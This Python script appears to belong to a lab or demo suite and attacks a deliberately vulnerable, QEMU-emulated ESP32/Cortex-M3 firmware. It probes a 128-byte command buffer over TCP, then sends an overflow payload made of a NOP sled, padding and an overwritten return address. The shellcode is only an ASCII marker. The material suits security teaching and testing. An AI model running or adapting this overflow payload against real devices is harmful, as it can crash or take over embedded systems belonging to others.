#!/usr/bin/env python3
"""
VESPER ESP32 — Suite 5: ESP32 Buffer-Overflow & Remote Code Execution
======================================================================
The VESPER firmware reads user-supplied TCP input into a fixed 128-byte
buffer with no bounds checking (gets-style).  A crafted payload overflows
the buffer, overwrites the return address on the Cortex-M3 stack, and
redirects execution to an attacker-controlled NOP-sled + shellcode.

This attack demonstrates:
  1. Stack buffer overflow via oversized TCP command.
  2. Return-address overwrite targeting the saved LR register.
  3. Shellcode injection (simulated: "PWNED" marker + state dump).
  4. Post-exploitation: device responds to attacker commands from the
     injected context, proving arbitrary code execution.

  CWE  : CWE-120 — Buffer Copy without Checking Size of Input
  CWE  : CWE-787 — Out-of-bounds Write
  CVSS : 9.8 (Critical)

Run standalone:
    python scripts/attacks/esp32_overflow.py --target 192.168.1.112:15011
    python scripts/attacks/esp32_overflow.py --target 192.168.1.112:15011 --buf-size 256
"""

import argparse
import socket
import struct
import sys
import time
from pathlib import Path

sys.path.insert(0, str(Path(__file__).parent.parent.parent))

from scripts.attacks.common import (
    GREEN, RED, YELLOW, MAGENTA, CYAN, DIM, BOLD, RESET,
    reset_clock, _ts, tx, rx, section, divider,
    send, verify_connection, print_result,
)


# ── Cortex-M3 payload construction ───────────────────────────────────────────

# The VESPER firmware command buffer is 128 bytes.
# Stack layout (lm3s6965evb / Cortex-M3):
#   [128-byte cmd_buf] [4-byte saved R7] [4-byte saved LR]
# Overflow offset to reach saved LR = 128 + 4 = 132 bytes.

DEFAULT_BUF_SIZE = 128
SAVED_R7_SIZE = 4
LR_OFFSET = DEFAULT_BUF_SIZE + SAVED_R7_SIZE   # 132

# Simulated Cortex-M3 shellcode:
# In a real attack this would be Thumb-2 machine code.
# Here we use a recognisable ASCII marker so the firmware's debug handler
# can detect and report successful injection (the QEMU firmware has a
# special OVERFLOW: detection path for this).
SHELLCODE_MARKER = b"VESPER_PWNED"
NOP_SLED = b"\x00\xbf" * 16  # Thumb NOP (mov r8, r8) × 16 = 32 bytes

# Fake return address — points into our NOP sled in the buffer.
# 0x20000080 is mid-SRAM on lm3s6965evb (QEMU default).
FAKE_LR = 0x20000080


def _build_overflow_payload(
    buf_size: int = DEFAULT_BUF_SIZE,
    fake_lr: int = FAKE_LR,
) -> bytes:
    """
    Construct the buffer-overflow payload:
      [NOP sled] [shellcode marker] [padding to LR_OFFSET] [fake LR]
    """
    # Fill the buffer with NOP sled + shellcode marker
    body = NOP_SLED + SHELLCODE_MARKER
    # Pad to reach saved-LR
    lr_off = buf_size + SAVED_R7_SIZE
    padding_needed = lr_off - len(body)
    if padding_needed > 0:
        body += b"A" * padding_needed
    # Overwrite saved LR (little-endian, Cortex-M3 Thumb bit set)
    body += struct.pack("<I", fake_lr | 1)  # bit 0 = Thumb mode
    # Trailing newline so the firmware's line-based parser processes it
    body += b"\n"
    return body


# ── Attack implementation ─────────────────────────────────────────────────────

def attack_esp32_overflow(host: str, port: int, buf_size: int = DEFAULT_BUF_SIZE) -> dict:
    """
    Send an oversized payload to the ESP32 firmware, overflow the command
    buffer, overwrite the saved return address, and verify code execution
    via the firmware's OVERFLOW: response or a change in device behaviour.
    """
    section(
        "Suite 5 — ESP32 BUFFER OVERFLOW: Stack Smash → Code Execution",
        f"Target: {host}:{port}  |  Buffer: {buf_size}B  |  CWE-120 / CWE-787  |  CVSS 9.8",
    )

    print(f"  {DIM}Cortex-M3 stack layout:{RESET}")
    print(f"  {DIM}  [128B cmd_buf] [4B saved R7] [4B saved LR] ← overflow here{RESET}")
    print(f"  {DIM}  LR offset: {LR_OFFSET} bytes from buffer start{RESET}")
    print(f"  {DIM}  Fake return addr: 0x{FAKE_LR:08X} (mid-SRAM NOP sled){RESET}\n")

    t0 = time.time()
    evidence: list = []
    overflow_detected = False
    rce_confirmed = False

    # ── Step 1: Baseline — send a normal command ──────────────────────────────
    divider("Step 1 — Baseline: send normal STATUS command")
    tx("STATUS", via=f"{host}:{port}")
    baseline = send(host, port, "STATUS")
    rx(baseline, "ESP32")
    evidence.append(f"Baseline response: {baseline.strip()[:80]}")

    if "ERROR" in baseline and "Connection" in baseline:
        print(f"  {RED}✗ Cannot reach device{RESET}")
        return _fail_result(baseline, t0)

    # ── Step 2: Probe buffer boundary ─────────────────────────────────────────
    print()
    divider("Step 2 — Probe buffer boundary with increasing payloads")

    boundary_found = False
    for probe_len in [64, 128, 132, 140, 160]:
        probe = b"A" * probe_len + b"\n"
        print(f"  {_ts()}{CYAN}→{RESET} Sending {probe_len} bytes ... ", end="", flush=True)
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(4.0)
            sock.connect((host, port))
            time.sleep(0.15)
            try:
                sock.recv(1024)  # drain banner
            except socket.timeout:
                pass
            sock.sendall(probe)
            resp = b""
            deadline = time.time() + 3
            while time.time() < deadline:
                try:
                    chunk = sock.recv(4096)
                    if not chunk:
                        break
                    resp += chunk
                    if b"OVERFLOW" in resp or b"ERROR" in resp or b"ACK" in resp:
                        break
                except socket.timeout:
                    break
            sock.close()

            resp_text = resp.decode("utf-8", errors="replace").strip()
            if "OVERFLOW" in resp_text or "FAULT" in resp_text or "CRASH" in resp_text:
                print(f"{RED}OVERFLOW/FAULT at {probe_len}B!{RESET}")
                evidence.append(f"Buffer boundary hit at {probe_len} bytes: {resp_text[:60]}")
                boundary_found = True
                break
            elif resp_text:
                print(f"{GREEN}OK{RESET}  ({resp_text[:40]})")
            else:
                print(f"{YELLOW}no response{RESET}")
                if probe_len > buf_size:
                    evidence.append(f"Device stopped responding at {probe_len}B — possible crash")
                    boundary_found = True
                    break
        except Exception as e:
            print(f"{RED}connection error: {e}{RESET}")
            if probe_len > buf_size:
                evidence.append(f"Connection failed at {probe_len}B — device likely crashed")
                boundary_found = True
                break

    if not boundary_found:
        evidence.append("Boundary probing inconclusive — proceeding with full exploit")
    time.sleep(0.5)

    # ── Step 3: Send the full overflow payload ────────────────────────────────
    print()
    divider("Step 3 — Send crafted overflow payload with NOP sled + shellcode")

    payload = _build_overflow_payload(buf_size, FAKE_LR)
    print(f"  {_ts()}{MAGENTA}Payload size:{RESET} {len(payload)} bytes")
    print(f"  {_ts()}{MAGENTA}NOP sled:{RESET}     {len(NOP_SLED)} bytes (Thumb NOPs)")
    print(f"  {_ts()}{MAGENTA}Shellcode:{RESET}    '{SHELLCODE_MARKER.decode()}' marker")
    print(f"  {_ts()}{MAGENTA}Padding:{RESET}      {LR_OFFSET - len(NOP_SLED) - len(SHELLCODE_MARKER)} bytes")
    print(f"  {_ts()}{MAGENTA}Fake LR:{RESET}      0x{FAKE_LR | 1:08X} (Thumb bit set)")

    print(f"\n  {_ts()}{CYAN}→{RESET} Sending exploit payload ...")

    exploit_resp = ""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(6.0)
        sock.connect((host, port))
        time.sleep(0.15)
        try:
            sock.recv(1024)  # drain banner
        except socket.timeout:
            pass

        sock.sendall(payload)

        resp_raw = b""
        deadline = time.time() + 5
        while time.time() < deadline:
            try:
                chunk = sock.recv(4096)
                if not chunk:
                    break
                resp_raw += chunk
                if (b"OVERFLOW" in resp_raw or b"PWNED" in resp_raw or
                        b"FAULT" in resp_raw or b"CRASH" in resp_raw):
                    break
            except socket.timeout:
                break
        sock.close()
        exploit_resp = resp_raw.decode("utf-8", errors="replace")
    except Exception as e:
        exploit_resp = f"ERROR: {e}"

    print()
    divider(f"Step 3b — Exploit response ({len(exploit_resp)} bytes)")
    rx(exploit_resp, "ESP32")

    # Parse results
    if "OVERFLOW" in exploit_resp:
        overflow_detected = True
        evidence.append(f"OVERFLOW confirmed: {exploit_resp.strip()[:80]}")
        print(f"  {RED}{BOLD}◄ BUFFER OVERFLOW DETECTED — stack corrupted!{RESET}")

        # Check for shellcode execution marker
        if "PWNED" in exploit_resp or "VESPER_PWNED" in exploit_resp:
            rce_confirmed = True
            evidence.append("Shellcode marker 'VESPER_PWNED' found — code execution achieved")
            print(f"  {RED}{BOLD}◄ REMOTE CODE EXECUTION CONFIRMED!{RESET}")
    elif "FAULT" in exploit_resp or "CRASH" in exploit_resp:
        overflow_detected = True
        evidence.append(f"Device fault/crash triggered: {exploit_resp.strip()[:80]}")
        print(f"  {RED}{BOLD}◄ DEVICE CRASH — exploitation possible with refined payload{RESET}")
    elif not exploit_resp.strip() or "ERROR" in exploit_resp:
        # No response = device crashed / rebooted
        overflow_detected = True
        evidence.append("Device unresponsive after payload — likely crashed (DoS achieved)")
        print(f"  {RED}◄ Device unresponsive — crash/reboot probable{RESET}")

    # ── Step 4: Post-exploitation probe ───────────────────────────────────────
    print()
    divider("Step 4 — Post-exploitation: probe device state")
    time.sleep(1.0)  # Give device time to reboot if it crashed

    tx("STATUS")
    post_resp = send(host, port, "STATUS")
    rx(post_resp, "ESP32")
    evidence.append(f"Post-exploit STATUS: {post_resp.strip()[:80]}")

    if "PWNED" in post_resp:
        rce_confirmed = True
        evidence.append("Post-exploit response contains shellcode marker — persistent RCE")
        print(f"  {RED}{BOLD}◄ PERSISTENT CODE EXECUTION — attacker controls device!{RESET}")
    elif not post_resp.strip() or "ERROR" in post_resp:
        evidence.append("Device still unresponsive post-exploit — DoS persists")
        print(f"  {RED}◄ Device remains down — Denial of Service{RESET}")

    # ── Build result ──────────────────────────────────────────────────────────
    success = overflow_detected
    if rce_confirmed:
        severity = "CRITICAL"
        impact = "Remote code execution — attacker has full control of ESP32 firmware"
    elif overflow_detected:
        severity = "CRITICAL"
        impact = "Stack buffer overflow triggers crash/DoS — RCE likely with refined payload"
    else:
        severity = "HIGH"
        impact = "Overflow inconclusive — device may have input length limits"

    return {
        "name": "ESP32 Buffer Overflow (Stack Smash → RCE)",
        "suite": "ESP32",
        "severity": severity,
        "success": success,
        "evidence": evidence,
        "duration_ms": (time.time() - t0) * 1000,
        "impact": impact,
        "cvss": 9.8,
        "details": {
            "overflow_detected": overflow_detected,
            "rce_confirmed": rce_confirmed,
            "payload_size": len(_build_overflow_payload(buf_size, FAKE_LR)),
            "buffer_size": buf_size,
            "lr_offset": LR_OFFSET,
            "fake_lr": f"0x{FAKE_LR:08X}",
        },
    }


def _fail_result(error: str, t0: float) -> dict:
    return {
        "name": "ESP32 Buffer Overflow (Stack Smash → RCE)",
        "suite": "ESP32",
        "severity": "CRITICAL",
        "success": False,
        "evidence": [f"Connection failed: {error}"],
        "duration_ms": (time.time() - t0) * 1000,
        "impact": "N/A — target unreachable",
        "cvss": 9.8,
    }


def main():
    parser = argparse.ArgumentParser(
        description="VESPER ESP32 — Suite 5: Buffer Overflow → RCE"
    )
    parser.add_argument("--target", required=True,
                        help="ESP32 address, e.g. 192.168.1.112:15011")
    parser.add_argument("--buf-size", type=int, default=DEFAULT_BUF_SIZE,
                        help=f"Target buffer size (default: {DEFAULT_BUF_SIZE})")
    parser.add_argument("--no-verify", action="store_true",
                        help="Skip connection check")
    args = parser.parse_args()

    parts = args.target.split(":")
    host = parts[0]
    port = int(parts[1]) if len(parts) > 1 else 15011

    reset_clock()
    print(f"\n{'='*60}")
    print(f"  Suite 5 — ESP32 Overflow  |  {host}:{port}")
    print(f"{'='*60}\n")

    if not args.no_verify and not verify_connection(host, port):
        print("Cannot reach ESP32.\n")
        return 1

    result = attack_esp32_overflow(host, port, buf_size=args.buf_size)
    print_result(result)
    return 0 if result["success"] else 1


if __name__ == "__main__":
    sys.exit(main())
